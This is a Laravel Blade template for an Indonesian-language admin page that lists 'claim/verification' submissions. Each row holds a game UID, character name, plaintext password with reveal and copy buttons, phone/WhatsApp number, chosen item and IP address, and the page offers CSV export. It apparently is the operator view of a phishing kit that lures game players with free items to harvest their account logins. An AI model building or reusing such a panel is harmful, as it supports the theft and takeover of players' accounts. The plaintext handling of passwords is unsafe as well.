@extends('panel.layout')

@section('title', 'Log Verifikasi / Klaim')
@section('page_title', 'LOG DATA KLAIM & VERIFIKASI')

@section('content')
<div class="space-y-6">

  <!-- Action Bar & Filter -->
  <div class="glass-card rounded-2xl p-5 border-red-900/40 flex flex-col md:flex-row md:items-center justify-between gap-4">
    
    <!-- Search Form -->
    <form action="{{ route('panel.claims') }}" method="GET" class="flex-1 max-w-md flex items-center gap-2">
      <div class="relative w-full">
        <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 pointer-events-none text-gray-500">
          <i class="fa-solid fa-magnifying-glass text-xs"></i>
        </span>
        <input type="text" name="search" value="{{ request('search') }}" 
               placeholder="Cari berdasarkan UID, Nama, No HP, atau Item..."
               class="w-full bg-[#180508] border border-red-900/60 focus:border-red-500 text-white text-xs rounded-xl py-2.5 pl-9 pr-3 outline-none"/>
      </div>
      <button type="submit" class="px-4 py-2.5 rounded-xl bg-red-950 text-red-300 border border-red-800 text-xs font-semibold hover:bg-red-900 transition-colors">
        Cari
      </button>
      @if(request('search'))
        <a href="{{ route('panel.claims') }}" class="p-2.5 rounded-xl bg-gray-900 text-gray-400 hover:text-white text-xs">
          <i class="fa-solid fa-xmark"></i>
        </a>
      @endif
    </form>

    <!-- Toolbar Buttons -->
    <div class="flex items-center gap-2.5">
      <a href="{{ route('panel.claims.export') }}" 
         class="px-4 py-2.5 rounded-xl bg-emerald-950/80 hover:bg-emerald-900 text-xs font-bold text-emerald-300 border border-emerald-600/40 transition-all flex items-center gap-2 shadow-sm">
        <i class="fa-solid fa-file-csv text-sm"></i> Download CSV Rekap
      </a>

      <form action="{{ route('panel.claims.clear') }}" method="POST" onsubmit="return confirm('PERINGATAN: Apakah Anda yakin ingin MENGHAPUS SEMUA riwayat verifikasi klaim? Tindakan ini tidak dapat dibatalkan.');">
        @csrf
        <button type="submit" 
                class="px-3 py-2.5 rounded-xl bg-red-950/60 hover:bg-red-900 text-xs font-semibold text-red-300 border border-red-800/50 transition-colors flex items-center gap-1.5">
          <i class="fa-solid fa-trash-can"></i> Bersihkan Log
        </button>
      </form>
    </div>

  </div>

  <!-- Claims Table -->
  <div class="glass-card rounded-2xl border-red-900/40 overflow-hidden shadow-xl">
    <div class="overflow-x-auto">
      <table class="w-full text-left text-xs">
        <thead class="bg-[#190407] border-b border-red-950 text-gray-400 uppercase font-bold text-[10px] tracking-wider">
          <tr>
            <th class="py-3 px-4">#</th>
            <th class="py-3 px-4">Waktu</th>
            <th class="py-3 px-4">UID Game</th>
            <th class="py-3 px-4">Nama Karakter</th>
            <th class="py-3 px-4">Password</th>
            <th class="py-3 px-4">Level</th>
            <th class="py-3 px-4">No HP / WhatsApp</th>
            <th class="py-3 px-4">Item Dipilih</th>
            <th class="py-3 px-4">IP Address</th>
            <th class="py-3 px-4 text-center">Aksi</th>
          </tr>
        </thead>
        <tbody class="divide-y divide-red-950/40">
          @forelse($claims as $index => $claim)
            <tr class="hover:bg-red-950/20 transition-colors">
              <td class="py-3 px-4 text-gray-500 font-mono text-[11px]">{{ $claims->firstItem() + $index }}</td>
              <td class="py-3 px-4 text-gray-300 text-[11px] whitespace-nowrap">
                <div>{{ $claim->created_at->format('d/m/Y') }}</div>
                <div class="text-[10px] text-gray-500">{{ $claim->created_at->format('H:i:s') }} WIB</div>
              </td>
              <td class="py-3 px-4">
                <span class="font-mono font-bold text-amber-300 select-all cursor-pointer" onclick="copyText('{{ $claim->uid }}')" title="Klik untuk salin">
                  {{ $claim->uid }} <i class="fa-regular fa-copy text-[10px] text-gray-500 ml-1"></i>
                </span>
              </td>
              <td class="py-3 px-4 font-semibold text-white">{{ $claim->nama }}</td>
              <td class="py-3 px-4">
                @if($claim->password)
                  <div class="flex items-center gap-1.5 font-mono">
                    <span class="text-amber-300 font-bold bg-[#140306] border border-red-900/60 px-2 py-0.5 rounded text-[11px] select-all cursor-pointer transition-colors"
                          data-password="{{ $claim->password }}"
                          data-masked="true"
                          onclick="copyPassword('{{ addslashes($claim->password) }}')"
                          title="Klik untuk salin">
                      ••••••••
                    </span>
                    <button type="button" onclick="togglePasswordRow(this)" class="text-gray-400 hover:text-amber-400 text-xs p-1" title="Lihat/Sembunyikan">
                      <i class="fa-solid fa-eye"></i>
                    </button>
                  </div>
                @else
                  <span class="text-gray-500 italic text-[11px]">-</span>
                @endif
              </td>
              <td class="py-3 px-4">
                <span class="px-2 py-0.5 rounded bg-gray-800 text-amber-300 font-mono text-[10px] font-bold">
                  Lv. {{ $claim->tingkat }}
                </span>
              </td>
              <td class="py-3 px-4 font-mono text-gray-200 select-all">
                <a href="https://wa.me/{{ preg_replace('/[^0-9]/', '', $claim->phone) }}" target="_blank" class="hover:text-emerald-400 transition-colors flex items-center gap-1">
                  {{ $claim->phone }} <i class="fa-brands fa-whatsapp text-emerald-400 text-xs"></i>
                </a>
              </td>
              <td class="py-3 px-4">
                <span class="px-2.5 py-1 rounded-lg bg-red-950/80 border border-red-700/60 text-red-200 font-medium text-[11px] inline-block">
                  {{ $claim->item }}
                </span>
              </td>
              <td class="py-3 px-4 font-mono text-gray-400 text-[11px]">{{ $claim->ip_address ?: '-' }}</td>
              <td class="py-3 px-4 text-center">
                <form action="{{ route('panel.claims.delete', $claim->id) }}" method="POST" onsubmit="return confirm('Hapus log ini?');">
                  @csrf
                  <button type="submit" class="p-1.5 rounded-lg text-gray-500 hover:text-red-400 hover:bg-red-950 transition-colors">
                    <i class="fa-solid fa-trash-can"></i>
                  </button>
                </form>
              </td>
            </tr>
          @empty
            <tr>
              <td colspan="10" class="py-12 text-center text-gray-500">
                <i class="fa-solid fa-clipboard-question text-3xl mb-2 text-gray-600 block"></i>
                Tidak ada data verifikasi ditemukan.
              </td>
            </tr>
          @endforelse
        </tbody>
      </table>
    </div>

    <!-- Pagination -->
    @if($claims->hasPages())
      <div class="p-4 border-t border-red-950/60 flex items-center justify-between">
        {{ $claims->links() }}
      </div>
    @endif
  </div>

</div>
@endsection

@section('scripts')
<script>
  function copyText(text) {
    navigator.clipboard.writeText(text);
    alert('UID ' + text + ' berhasil disalin!');
  }
  function copyPassword(pwd) {
    navigator.clipboard.writeText(pwd);
    alert('Password berhasil disalin!');
  }
  function togglePasswordRow(btn) {
    const span = btn.previousElementSibling;
    const isMasked = span.getAttribute('data-masked') === 'true';
    const raw = span.getAttribute('data-password');
    const icon = btn.querySelector('i');
    if (isMasked) {
      span.textContent = raw;
      span.setAttribute('data-masked', 'false');
      icon.classList.remove('fa-eye');
      icon.classList.add('fa-eye-slash');
    } else {
      span.textContent = '••••••••';
      span.setAttribute('data-masked', 'true');
      icon.classList.remove('fa-eye-slash');
      icon.classList.add('fa-eye');
    }
  }
</script>
@endsection
